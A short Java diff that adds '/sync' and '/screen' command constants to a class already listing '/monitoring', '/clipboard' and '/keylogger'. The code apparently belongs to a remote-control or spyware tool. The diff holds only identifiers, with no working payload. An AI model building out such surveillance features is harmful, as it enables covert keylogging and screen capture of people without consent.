@@ -15,4 +15,6 @@ public class Command {
     public static final String COMMAND_MONITORING = "/monitoring";
     public static final String COMMAND_CLIPBOARD = "/clipboard";
     public static final String COMMAND_KEYLOGGER = "/keylogger";
+    public static final String COMMAND_SYNC = "/sync";
+    public static final String COMMAND_CLIENT_SCREEN = "/screen";
 }
